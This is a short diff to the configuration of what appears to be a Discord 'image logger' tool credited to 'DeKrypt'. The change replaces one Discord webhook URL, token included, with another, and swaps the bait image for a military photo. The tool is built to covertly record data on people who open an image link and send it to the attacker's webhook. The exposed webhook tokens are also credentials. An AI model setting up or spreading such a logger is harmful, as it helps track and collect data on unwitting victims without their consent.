@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://ptb.discord.com/api/webhooks/1357349194117152768/M9q3VgIdIt3oF88tZy89X8QNZtW9HnctHNgNE_s6p9DII-V3mEx0VBN6Cy97TCG6GIfz",
-    "image": "https://i.imgflip.com/19tawb.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1365884154645975080/kjmpCbEe6fGzsNuv7wsiHTzyykU41u1s3Qtditt9mS7K39T4EsSdpk8VqzfsCrfAgyeJ",
+    "image": "https://pakistanarmedforceslovers.wordpress.com/wp-content/uploads/2015/01/pak-army.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
